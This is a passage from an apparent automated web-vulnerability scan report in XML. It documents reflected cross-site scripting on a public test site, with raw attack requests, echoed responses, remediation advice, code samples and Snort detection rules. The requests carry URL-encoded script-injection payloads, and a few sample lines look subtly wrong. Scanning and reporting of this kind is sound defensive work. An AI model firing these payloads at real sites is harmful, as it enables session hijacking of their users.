Description</Name><SectionText><![CDATA[When successfully exploited, Cross-Site Scripting gives an attacker a method of taking control of the interaction between a user and a web site. On a simple site composed of static content, this might only lead to changing how pages display to a specific user. When the site is capable of accepting user input, such as login information, or allows users to make choices with real world implications such as transferring funds or accessing private data, Cross-Site Scripting presents its most serious threat. The most significant danger from a successful Cross-Site Scripting attack is that an attacker will be able to emulate the credentials of an actual user by gaining access to a user’s session cookie, thereby hijacking the user session and taking over the account. The FDIC has recently indicated that unauthorized access to checking accounts is the fastest growing form of identity theft. More often than not, these instances of account hijacking are due to the presence of Cross-site scripting vulnerabilities. When an attacker gains control on the user’s end, it then often becomes unnecessary to break into the server. By that point, he already has the means to acquire the information he needs.]]></SectionText></ReportSection><ReportSection><Name>Probability Score</Name><SectionText><![CDATA[Critical]]></SectionText></ReportSection><ReportSection><Name>Probability Description</Name><SectionText><![CDATA[To carry out a Cross-Site Scripting attack, an attacker will create a URL that takes advantage of a Cross-Site Scripting flaw. The attacker must then find some way of getting a victim to visit this URL. This can be done in many ways, ranging from getting it listed in a search engine to exploiting weaknesses in mail clients that allow scripted content to be executed. Once the victim has used the Cross-Site Scripting URL, the attacker's malicious code will be executed on his or her system.  In other words, there is a lot of effort required up-front for these attacks to be successful.  However, the potential payoff makes that effort worthwhile more often than not.]]></SectionText></ReportSection><ReportSection><Name>Risk Score</Name><SectionText><![CDATA[High]]></SectionText></ReportSection><ReportSection><Name>Risk Description</Name><SectionText><![CDATA[This vulnerability should be addressed quickly, especially if the application is already in production.]]></SectionText></ReportSection><ReportSection><Name>Fix Description</Name><SectionText><![CDATA[Cross-Site Scripting attacks can be avoided by carefully validating all input, and properly encoding all output. Validation can be done using standard ASP.NET Validation controls, or directly in your code. Do not attempt to sanitize input by removing script strings or characters, simply reject it. Always use as strict a pattern as you can possibly allow.<br /><br />
Encoding of output insures that any scriptable content is properly encoded for HTML before being sent to the client. This is done with the function HttpUtility.HtmlEncode, as shown in the following Label control sample:<br /><br />
	Label2.Text = HttpUtility.HtmlEncode(input)
<br /><br />Be sure to consider all paths that user input takes through your application. For instance, if data is entered by the user, stored in a database, and then redisplayed later, you must make sure it is properly encoded each time it is retrieved.If you must allow free-format text input, such as in a message board, and you wish to allow some HTML formatting to be used, you can handle this safely by explicitly allowing only a small list of safe tags. Here is an example of how to do this safely:<br /><br />
C# Example:<br /><br />
            StringBuilder sb = new StringBuilder(<br />
                HttpUtility.HtmlEncode(input)); <br />
            sb.Replace("&amp;lt;b&amp;gt;", "&lt;b&gt;"); <br />
            sb.Replace("&amp;lt;/b&amp;gt;", "&lt;b&gt;"); <br />
            sb.Replace("&amp;lt;i&amp;gt;", "&lt;i&gt;"); <br />
            sb.Replace("&amp;lt;/i&amp;gt;", "&lt;/i&gt;"); <br />
            Response.Write(sb.ToString());<br /><br />

VB.NET Example: <br /><br />
        Dim sb As StringBuilder = New StringBuilder( _ <br />
                HttpUtility.HtmlEncode(input)) <br />
        sb.Replace("&amp;lt;b&amp;gt;", "&lt;b&gt;") <br />
        sb.Replace("&amp;lt;/b&amp;gt;", "&lt;b&gt;") <br />
        sb.Replace("&amp;lt;i&amp;gt;", "&lt;i&gt;") <br />
        sb.Replace("&amp;lt;/i&amp;gt;", "&lt;/i&gt;") <br />
        Response.Write(sb.ToString())<br /><br />

The following recommendations will help you build web applications capable of withstanding Cross-Site Scripting attacks. 
<ul><li>Define what is allowed. Ensure that the web application validates all input parameters (cookies, headers, query strings, forms, hidden fields, etc.) against a stringent definition of expected results. </li><li>Check the responses from POST and GET requests to ensure what is being returned is what is expected, and is valid. </li><li>Use client-side validation when adding extra functionality to user input checking in addition to other forms of data checking. </li><li>Remove conflicting characters, brackets, and single and double quotes from user input by encoding user supplied data. This will prevent inserted scripts from being sent to end users in a form that can be executed. </li><li>Whenever possible, limit all client-supplied data to alphanumeric data. Using this filtering scheme, if a user entered " &lt;script&gt;alertdocumentcookie( 'aaa') &lt;/script&gt;", it would be reduced to "scriptalertdocumentcookiescript". If non-alphanumeric characters must be used, encode them as HTML entities before using them in an HTTP response, so that they cannot be used to modify the structure of the HTML document. </li><li>Use two-factor customer authentication mechanisms as opposed to single-factor authentication. </li><li>Verify the origin of scripts before you modify or utilize them. </li><li>Do not implicitly trust any script given to you by others (whether downloaded from the web, or given to you by an acquaintance) for use in your own code. </li></ul>
Most server side scripting languages provide built in methods to convert the value of the input variable into correct, non-interpretable HTML. These should be used to sanitize all input before displayed to the client. 
<br /><br />
ASP / ASP.NET: Server.HTMLEncode (strHTML String)<br /><br />]]></SectionText></ReportSection><ReportSection><Name>References</Name><SectionText /></ReportSection><ReportSection><Name>Fix Description</Name><SectionText><![CDATA[<br />The following recommendations will help you build web applications capable of withstanding Cross-Site Scripting attacks. 
<ul><li>Define what is allowed. Ensure that the Web application validates all input parameters (cookies, headers, query strings, forms, hidden fields, etc.) against a stringent definition of expected results. </li><li>Check the responses from POST and GET requests to ensure the data being returned is what is expected, and is valid. </li><li>When adding extra functionality to user-input checking, use client-side validation in addition to other forms of data checking. </li><li>Remove conflicting characters, brackets, and single and double quotes from user input by encoding user-supplied data. This will prevent inserted scripts from being sent to end users in a form that can be executed. </li><li>Whenever possible, limit all client-supplied data to alphanumeric data. Using this filtering scheme, if a user entered "&lt;script&gt;alertdocumentcookie('aaa')&lt;/script&gt;", it would be reduced to "scriptalertdocumentcookiescript". If non-alphanumeric characters must be used, encode them as HTML entities before using them in an HTTP response. Encoding ensures that the characters cannot be used to modify the structure of the HTML document. </li><li>Use two-factor customer authentication mechanisms, such as requiring a token and password, as opposed to single-factor authentication, such as requiring only a password. </li><li>Verify the origin of scripts before you modify or utilize them. </li><li>Do not implicitly trust any script given to you by others (whether downloaded from the Web or given to you by an acquaintance) for use in your own code. </li></ul>
The Java language does not have a built-in method to convert the value of the input variable into correct, non-interpretable HTML. The following code samples show two different ways of writing a utility method to sanitize all user input before displaying it back to the client. <br /><br /><br />
public static String HTMLEncode(String aTagFragment){ <br /><br />
  //make sure you replace &amp; first<br />
  aTagFragment = aTagFragment.replaceAll("&amp;", "&amp;amp;"); <br />
  aTagFragment = aTagFragment.replaceAll("&lt;", "&amp;lt;"); <br />
  aTagFragment = aTagFragment.replaceAll("&gt;", "&amp;gt;"); <br />
  aTagFragment = aTagFragment.replaceAll("\"", "&amp;quot;"); <br />
  aTagFragment = aTagFragment.replaceAll("'", "&amp;#39;"); <br />
  //replace backslash ‘\’ character<br />
  aTagFragment = aTagFragment.replaceAll("\\\\", "&amp;#92;"); <br /><br />
  return aTagFragment; <br />
}<br /><br />
public static String HTMLEncode(String aTagFragment){ <br />
  final StringBuffer result = new StringBuffer();<br />
  final StringCharacterIterator iterator = new StringCharacterIterator(aTagFragment); <br />
  char character = iterator.current();<br />
  while (character != StringCharacterIterator.DONE ){ <br />
   		if (character == '&lt;') { <br />
   			result.append("&amp;lt;"); <br />
   		} <br />
   		else if (character == '&gt;') { <br />
   			result.append("&amp;gt;"); <br />
   		} <br />
   		else if (character == '\"') { <br />
   			result.append("&amp;quot;"); <br />
   		} <br />
   		else if (character == '\'") { <br />
   			result.append("&amp;#39;"); <br />
   		} <br />
   		else if (character == '\\') { <br />
   			result.append("&amp;#92;"); <br />
   		} <br />
   		else if (character == '&amp;') { <br />
   			result.append("&amp;amp;"); <br />
   		} <br />
   		else { <br />
   			//the char is not a special one <br />
   			//add it to the result as is <br />
   			result.append(character); <br />
   		} <br />
   		character = iterator.next();<br />
   	} <br />
   	return result.toString();<br />
}]]></SectionText></ReportSection><ReportSection><Name>References</Name><SectionText /></ReportSection></Issue></Issues><RawRequest id="2365EB6104765CC0E13D102C9CFB79D0"><![CDATA[POST /secured/newuser.php HTTP/1.1
Referer: http://php.vulnweb.com/signup.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 242
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="2365EB6104765CC0E13D102C9CFB79D0";PSID="FAF765E4B6181822E8C9C961F9569838";SessionType="AuditAttack";CrawlType="None";AttackType="PostParamManipulation";OriginatingEngineID="1354e211-9d7d-4cc1-80e6-4de3fd128002";AttackSequence="2";AttackParamDesc="uuname";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="5105";Engine="Cross+Site+Scripting";SmartMode="4";AttackString="12345%253c%2573%2543%2572%2549%2570%2554%253e%2561%256c%2565%2572%2574%2528%2532%2536%2537%2536%2531%2529%253c%252f%2573%2543%2572%2549%2570%2554%253e";AttackStringProps="Attack";tid="40";tt="40";
X-RequestManager-Memo: sid="29";smi="0";sc="1";ID="39839094";
X-Request-Memo: ID="c741737c";sc="1";tid="40";
Cookie: CustomCookie=WebInspect0

uuname=12345%3c%73%43%72%49%70%54%3e%61%6c%65%72%74%28%32%36%37%36%31%29%3c%2f%73%43%72%49%70%54%3e&upass=foo&upass2=foo&urname=12345&ucc=12345&uemail=John.Doe%40somewhere.com&uphone=770&uaddress=1707%20Interdimensional%20Street&signup=signup]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:52:22 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 811

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<title>add new user</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<link href="style.css" rel="stylesheet" type="text/css">
</head>
<body>
<div id="masthead"> 
  <h1 id="siteName">ACUNETIX ART</h1> 
</div>
<div id="content">
	<p>You have been introduced to our database with the above informations:</p><ul><li>Username: 12345<sCrIpT>alert(26761)</sCrIpT></li><li>Password: foo</li><li>Name: 12345</li><li>Address: 1707 Interdimensional Street</li><li>E-Mail: John.Doe@somewhere.com</li><li>Phone number: 770</li><li>Credit card: 12345</li></ul><p>Now you can login from <a href='http://php.vulnweb.com/login.php'>here.</p></div>
</body>
</html>
]]></RawResponse><Request id="2365EB6104765CC0E13D102C9CFB79D0"><Method>POST</Method><Path>/secured/</Path><File>newuser</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData>uuname=12345%3c%73%43%72%49%70%54%3e%61%6c%65%72%74%28%32%36%37%36%31%29%3c%2f%73%43%72%49%70%54%3e&amp;upass=foo&amp;upass2=foo&amp;urname=12345&amp;ucc=12345&amp;uemail=John.Doe%40somewhere.com&amp;uphone=770&amp;uaddress=1707%20Interdimensional%20Street&amp;signup=signup</FullPostData><XMLPostData /><MultiPartPostData /><RawASCIIPostData /><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/signup.php</Value></Header><Header><Name>Content-Type</Name><Value>application/x-www-form-urlencoded</Value></Header><Header><Name>Content-Length</Name><Value>242</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Audit.Attack";SID="2365EB6104765CC0E13D102C9CFB79D0";PSID="FAF765E4B6181822E8C9C961F9569838";SessionType="AuditAttack";CrawlType="None";AttackType="PostParamManipulation";OriginatingEngineID="1354e211-9d7d-4cc1-80e6-4de3fd128002";AttackSequence="2";AttackParamDesc="uuname";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="5105";Engine="Cross+Site+Scripting";SmartMode="4";AttackString="12345%253c%2573%2543%2572%2549%2570%2554%253e%2561%256c%2565%2572%2574%2528%2532%2536%2537%2536%2531%2529%253c%252f%2573%2543%2572%2549%2570%2554%253e";AttackStringProps="Attack";tid="40";tt="40";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="29";smi="0";sc="1";ID="39839094";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="c741737c";sc="1";tid="40";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<title>add new user</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<link href="style.css" rel="stylesheet" type="text/css">
</head>
<body>
<div id="masthead"> 
  <h1 id="siteName">ACUNETIX ART</h1> 
</div>
<div id="content">
	<p>You have been introduced to our database with the above informations:</p><ul><li>Username: 12345<sCrIpT>alert(26761)</sCrIpT></li><li>Password: foo</li><li>Name: 12345</li><li>Address: 1707 Interdimensional Street</li><li>E-Mail: John.Doe@somewhere.com</li><li>Phone number: 770</li><li>Credit card: 12345</li></ul><p>Now you can login from <a href='http://php.vulnweb.com/login.php'>here.</p></div>
</body>
</html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:52:22 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>811</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="C62E30BACFBE91FE1BBC2C5F4D6D7D56"><URL>http://php.vulnweb.com:80/hpp/params.php?p=valid%3c%73%43%72%49%70%54%3e%61%6c%65%72%74%28%37%37%32%34%31%29%3c%2f%73%43%72%49%70%54%3e&amp;pp=12&amp;aaaa=Submit</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor>p</AttackParamDescriptor><Issues><Issue id="448df2f0-bfc5-4a48-a850-6c7e8c3731bf"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>5105</EngineType><AttackHTTPRequest><![CDATA[GET /hpp/params.php?p=valid%3c%73%43%72%49%70%54%3e%61%6c%65%72%74%28%37%37%32%34%31%29%3c%2f%73%43%72%49%70%54%3e&pp=12&aaaa=Submit HTTP/1.1
Referer: http://php.vulnweb.com/hpp/?pp=12
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="C62E30BACFBE91FE1BBC2C5F4D6D7D56";PSID="793A823C2E6F80ADC40DEDD5432FE66A";SessionType="AuditAttack";CrawlType="None";AttackType="QueryParamManipulation";OriginatingEngineID="1354e211-9d7d-4cc1-80e6-4de3fd128002";AttackSequence="2";AttackParamDesc="p";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="5105";Engine="Cross+Site+Scripting";SmartMode="4";AttackString="valid%253c%2573%2543%2572%2549%2570%2554%253e%2561%256c%2565%2572%2574%2528%2537%2537%2532%2534%2531%2529%253c%252f%2573%2543%2572%2549%2570%2554%253e";AttackStringProps="Attack";tid="42";tt="40";
X-RequestManager-Memo: sid="33";smi="0";sc="1";ID="b25dae92";
X-Request-Memo: ID="55fcb3ca";sc="1";tid="42";
Cookie: CustomCookie=WebInspect0

]]></AttackHTTPRequest><VulnerabilityID>5649</VulnerabilityID><Severity>4</Severity><Name>Cross-Site Scripting</Name><Classifications><Classification kind="CWE" identifier="CWE-80" href="http://cwe.mitre.org/data/definitions/80.html">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</Classification><Classification kind="7PK" identifier="Input Validation and Representation" href="https://vulncat.fortify.com/">Input Validation and Representation</Classification><Classification kind="7PK Category" identifier="Cross-Site Scripting: Reflected" href="https://vulncat.fortify.com/">Cross-Site Scripting: Reflected</Classification></Classifications><DetectionSelection><Location offset="285" length="29" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[<drc_fortify /><hp-img src="xss.rgc" /><br /><drc_xssrf />A Cross-Site Scripting (XSS) vulnerability was detected in the web application. Cross-Site Scripting occurs when dynamically generated web pages display user input, such as login information, that is not properly validated, allowing an attacker to embed malicious scripts into the generated page and then execute the script on the machine of any user that views the site. In this instance, the web application was vulnerable to an automatic payload, meaning the user simply has to visit a page to make the malicious scripts execute. If successful, Cross-Site Scripting vulnerabilities can be exploited to manipulate or steal cookies, create requests that can be mistaken for those of a valid user, compromise confidential information, or execute malicious code on end user systems. Recommendations include implementing secure programming techniques that ensure proper filtration of user-supplied data, and encoding all user supplied data to prevent inserted scripts being sent to end users in a format that can be executed.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText><![CDATA[<br />
Cross-Site Scripting(XSS) happens when user input from a web client is immediately included via server-side scripts in a dynamically generated web page. Reflected XSS is specifically considered critical when malicious payload can be embedded in a URL (e.g. in query strings of GET requests). An attacker can trick a victim, via phishing attack, to click on a link with vulnerable input which has been altered to include attack code and then sent to the legitimate server. The injected code is then reflected back to the user's browser which executes it. <br /><br />

The implications of successful Cross-Site Scripting attacks are:

<ul><li>Account hijacking -  An attacker can hijack the user's session before the session cookie expires and take actions with the privileges of the user who accessed the URL, such as issuing database queries and viewing the results. </li><li>Malicious script execution - Users can unknowingly execute JavaScript, VBScript, ActiveX, HTML, or even Flash content that has been inserted into a dynamically generated page by an attacker. 

</li><li>Worm propagation - With Ajax applications, XSS can propagate somewhat like a virus. The XSS payload can autonomously inject itself into pages, and easily re-inject the same host with more XSS, all of which can be done with no hard refresh. Thus, XSS can send multiple requests using complex HTTP methods to propagate itself invisibly to the user.
</li><li>Information theft - Via redirection and fake sites, attackers can connect users to a malicious server of the attacker's choice and capture any information entered by the user.</li><li>	Denial of Service - Often by utilizing malformed display requests on sites that contain a Cross-Site Scripting vulnerability, attackers can cause a denial of service condition to occur by causing the host site to query itself repeatedly . </li><li>Browser Redirection - On certain types of sites that use frames, a user can be made to think that he is in fact on the original site when he has been redirected to a malicious one, since the URL in the browser's address bar will remains the same. This is because the entire page isn't being redirected, just the frame in which the JavaScript is being executed is redirected. </li><li>	Manipulation of user settings - Attackers can change user settings for nefarious purposes. </li><li>Bypass Content-Security-Policy protection  -  Attackers can inject a malformed tag formation, known as dangling tag injection, which in some cases allows injected script to reuse valid nonce on the page and bypass script source restriction. Additionally dangling tag injection can be used to steal sensitive information embedded in HTML response if browser is able to make a request to the injected link. </li><li>Base tag injection: Attacker can cause relative links on a page to load from a different domain by modifying the base URL for the page via base tag injection.</li><li>Link prefetch injection: While unable to execute script, attackers can use link tag with rel=prefetch that will make browsers pre-fetch the specified link even though it is never rendered and rejected subsequently due to web application enforced cross-site policy (e.g. CSP protections).</li><li>Edge side includes (ESI) Injection - ESI  is a markup language used in various HTTP devices, such as reverse proxies and load balancers, that are positioned between client and server.  An attacker can inject ESI markup to perform critical attacks such as cross-site scripting and HTTPOnly cookie protection bypass. </li></ul>]]></SectionText></ReportSection><ReportSection><Name>Execution</Name><SectionText><![CDATA[<br />

View the attack string included with the request to check what to search for in the response. For instance, if "(javascript:alert('XSS')"  is submitted as an attack (or another scripting language), it will also appear as part of the response.  This indicates that the web application is taking values from the HTTP request parameters and using them in the HTTP response without first removing potentially malicious data.


The response can be viewed in “Web Browser” view in the Vulnerability pane to see the injected popup events in action. Events requiring user interaction (e.g. onmouseover or onclick events) can be triggered by performing the corresponding action (e.g. clicking the injected link). 



Injection with numeric string in src, or href, attributes indicates that the site is vulnerable to script include or content exfiltration. These can be verified by repeating the request in a browser and intercepting originating network traffic in a web proxy.]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br /><b>For Development:</b><br /><br />
Cross-Site Scripting attacks can be avoided by carefully validating all input, and properly encoding all output. When validating user input, 

verify that it matches the strictest definition of valid input possible. For example, if a certain parameter is supposed to be a number, attempt 

to convert it to a numeric data type in your programming language. <br /><br /><b>PHP:</b> intval("0".$_GET['q']);   <br /><br /><b>ASP.NET:</b> 

int.TryParse(Request.QueryString["q"], out val); <br /><br />

The same applies to date and time values, or anything that can be converted to a stricter type before being used. When accepting other types of 

text input, make sure the value matches either a list of acceptable values (white-listing), or a strict regular expression. If at any point the 

value appears invalid, do not accept it. Also, do not attempt to return the value to the user in an error message. <br /><br />

Most server side scripting languages provide built in methods to convert the value of the input variable into correct, non-interpretable HTML. 

These should be used to sanitize all input before it is displayed to the client. <br /><br /><b>PHP:</b>  string htmlspecialchars (string string 

[, int quote_style])<br /><br /><b>ASP.NET:</b> Server.HTMLEncode (strHTML String)



<br /><br />

When reflecting values into JavaScript or another format, make sure to use a type of encoding that is appropriate. Encoding data for HTML is not 

sufficient when it is reflected inside of a script or style sheet. For example, when reflecting data in a JavaScript string, make sure to encode 

all non-alphanumeric characters using hex (\xHH) encoding.<br /><br />

If you have JavaScript on your page that accesses unsafe information (like location.href) and writes it to the page (either with document.write, 

or by modifying a DOM element), make sure you encode data for HTML before writing it to the page. JavaScript does not have a built-in function to 

do this, but many frameworks do. If you are lacking an available function, something like the following will handle most cases:<br /><br />

s = s.replace(/&amp;/g,'&amp;amp;').replace(/"/i,'&amp;quot;').replace(/&lt;/i,'&amp;lt;').replace(/&gt;/i,'&amp;gt;').replace(/'/i,'&amp;apos;')


<br /><br />

Ensure that you are always using the right approach at the right time. Validating user input should be done as soon as it is received. Encoding 

data for display should be done immediately before displaying it.

<b><br /><br />


For Security Operations:</b><br /><br />

Server-side encoding, where all dynamic content is first sent through an encoding function where Scripting tags will be replaced with codes in the 

selected character set, can help to prevent Cross-Site Scripting attacks. <br /><br />

Many web application platforms and frameworks have some built-in support for preventing Cross-Site Scripting. Make sure that any built-in 

protection is enabled for your platform. In some cases, a misconfiguration could allow Cross-Site Scripting. In ASP.NET, if a page's 

EnableViewStateMac property is set to False, the ASP.NET view state can be used as a vector for Cross-Site Scripting. <br /><br />

An IDS or IPS can also be used to detect or filter out XSS attacks. Below are a few regular expressions that will help detect Cross-Site 

Scripting. <br /><br /><b>Regex for a simple XSS attack:</b><br />
/((\%3C)|&lt;)((\%2F)|\/)*[a-z0-9\%]+((\%3E)|&gt;)/ix <br /><br />

The above regular expression would be added into a new Snort rule as follows: <br /><br />

alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"NII Cross-Site Scripting attempt"; flow:to_server,established; 

pcre:"/((\%3C)|&lt;)((\%2F)|\/)*[a-z0-9\%]+((\%3E)|&gt;)/i"; classtype:Web-application-attack; sid:9000; rev:5;) <br /><br /><b>Paranoid regex for 

XSS attacks:</b><br />
/((\%3C)|&lt;)[^\n]+((\%3E)|&gt;)/I <br /><br />

This signature simply looks for the opening HTML tag, and its hex equivalent, followed by one or more characters other than the new line, and then 

followed by the closing tag or its hex equivalent. This may end up giving a few false positives depending upon how your web application and web 

server are structured, but it is guaranteed to catch anything that even remotely resembles a Cross-Site Scripting attack.

<br /><br /><b>For QA:</b><br /><br />


Fixes for Cross-Site Scripting defects will ultimately require code based fixes. Read the the following links for more information 

about manually testing your application for Cross-Site Scripting.]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br /><br /><b>OWASP Cross-Site Scripting Information</b><br /><a href="https://www.owasp.org/index.php/XSS">https://www.owasp.org/index.php/XSS</a><br /><br /><b>CERT</b><br /><a href="http://www.cert.org/advisories/CA-2000-02.html">http://www.cert.org/advisories/CA-2000-02.html</a><br /><br /><b>Apache</b><br /><a href="http://httpd.apache.org/info/css-security/apache_specific.html">http://httpd.apache.org/info/css-security/apache_specific.html</a><br /><br /><b>SecurityFocus.com</b><br /><a href="http://www.securityfocus.com/infocus/1768 ">http://www.securityfocus.com/infocus/1768 </a>]]></SectionText></ReportSection><ReportSection><Name>Description</Name><SectionText><![CDATA[Cross-Site Scripting occurs when dynamically generated web pages display input, such as login information, that is not properly validated, allowing an attacker to embed malicious scripts into the generated page and then execute the script on the machine of any user that views the site. If successful, Cross-Site Scripting vulnerabilities can be exploited to manipulate or steal cookies, create requests that can be mistaken for those of a valid user, compromise confidential information, or execute malicious code on the end user systems for a variety of nefarious purposes. Recommendations include implementing secure programming techniques that ensure proper filtration of user-supplied data, utilizing client-side validation of user supplied data, and encoding all user supplied data to prevent inserted scripts being sent to end users in a format that can be executed.]]></SectionText></ReportSection><ReportSection><Name>Impact Score</Name><SectionText><![CDATA[High]]></SectionText></ReportSection><ReportSection><Name>Impact Description</Name><SectionText><![CDATA[When successfully exploited, Cross-Site Scripting gives an attacker a method of taking control of the interaction between a user and a web site. On a simple site composed of static content, this might only lead to changing how pages display to a specific user. When the site is capable of accepting user input, such as login information, or allows users to make choices with real world implications such as transferring funds or accessing private data, Cross-Site Scripting presents its most serious threat. The most significant danger from a successful Cross-Site Scripting attack is that an attacker will be able to emulate the credentials of an actual user by gaining access to a user’s session cookie, thereby hijacking the user session and taking over the account. The FDIC has recently indicated that unauthorized access to checking accounts is the fastest growing form of identity theft. More often than not, these instances of account hijacking are due to the presence of Cross-site scripting vulnerabilities. When an attacker gains control on the user’s end, it then often becomes unnecessary to break into the server. By that point, he already has the means to acquire the information he needs.]]></SectionText></ReportSection><ReportSection><Name>Probability Score</Name><SectionText><![CDATA[Critical]]></SectionText></ReportSection><ReportSection><Name>Probability Description</Name><SectionText><![CDATA[To carry out a Cross-Site Scripting attack, an attacker will create a URL that takes advantage of a Cross-Site Scripting flaw. The attacker must then find some way of getting a victim to visit this URL. This can be done in many ways, ranging from getting it listed in a search engine to exploiting weaknesses in mail clients that allow scripted content to be executed. Once the victim has used the Cross-Site Scripting URL, the attacker's malicious code will be executed on his or her system.  In other words, there is a lot of effort required up-front for these attacks to be successful.  However, the potential payoff makes that effort worthwhile more often than not.]]></SectionText></ReportSection><ReportSection><Name>Risk Score</Name><SectionText><![CDATA[High]]></SectionText></ReportSection><ReportSection><Name>Risk Description</Name><SectionText><![CDATA[This vulnerability should be addressed quickly, especially if the application is already in production.]]></SectionText></ReportSection><ReportSection><Name>Fix Description</Name><SectionText><![CDATA[Cross-Site Scripting attacks can be avoided by carefully validating all input, and properly encoding all output. Validation can be done using standard ASP.NET Validation controls, or directly in your code. Do not attempt to sanitize input by removing script strings or characters, simply reject it. Always use as strict a pattern as you can possibly allow.<br /><br />
Encoding of output insures that any scriptable content is properly encoded for HTML before being sent to the client. This is done with the function HttpUtility.HtmlEncode, as shown in the following Label control sample:<br /><br />
	Label2.Text = HttpUtility.HtmlEncode(input)
<br /><br />Be sure to consider all paths that user input takes through your application. For instance, if data is entered by the user, stored in a database, and then redisplayed later, you must make sure it is properly encoded each time it is retrieved.If you must allow free-format text input, such as in a message board, and you wish to allow some HTML formatting to be used, you can handle this safely by explicitly allowing only a small list of safe tags. Here is an example of how to do this safely:<br /><br />
C# Example:<br /><br />
            StringBuilder sb = new StringBuilder(<br />
                HttpUtility.HtmlEncode(input)); <br />
            sb.Replace("&amp;lt;b&amp;gt;", "&lt;b&gt;"); <br />
            sb.Replace("&amp;lt;/b&amp;gt;", "&lt;b&gt;"); <br />
            sb.Replace("&amp;lt;i&amp;gt;", "&lt;i&gt;"); <br />
            sb.Replace("&amp;lt;/i&amp;gt;", "&lt;/i&gt;"); <br />
            Response.Write(sb.ToString());<br /><br />

VB.NET Example: <br /><br />
        Dim sb As StringBuilder = New StringBuilder( _ <br />
                HttpUtility.HtmlEncode(input)) <br />
        sb.Replace("&amp;lt;b&amp;gt;", "&lt;b&gt;") <br />
        sb.Replace("&amp;lt;/b&amp;gt;", "&lt;b&gt;") <br />
        sb.Replace("&amp;lt;i&amp;gt;", "&lt;i&gt;") <br />
        sb.Replace("&amp;lt;/i&amp;gt;", "&lt;/i&gt;") <br />
        Response.Write(sb.ToString())<br /><br />

The following recommendations will help you build web applications capable of withstanding Cross-Site Scripting attacks. 
<ul><li>Define what is allowed. Ensure that the web application validates all input parameters (cookies, headers, query strings, forms, hidden fields, etc.) against a stringent definition of expected results. </li><li>Check the responses from POST and GET requests to ensure what is being returned is what is expected, and is valid. </li><li>Use client-side validation when adding extra functionality to user input checking in addition to other forms of data checking. </li><li>Remove conflicting characters, brackets, and single and double quotes from user input by encoding user supplied data. This will prevent inserted scripts from being sent to end users in a form that can be executed. </li><li>Whenever possible, limit all client-supplied data to alphanumeric data. Using this filtering scheme, if a user entered " &lt;script&gt;alertdocumentcookie( 'aaa') &lt;/script&gt;", it would be reduced to "scriptalertdocumentcookiescript". If non-alphanumeric characters must be used, encode them as HTML entities before using them in an HTTP response, so that they cannot be used to modify the structure of the HTML document. </li><li>Use two-factor customer authentication mechanisms as opposed to 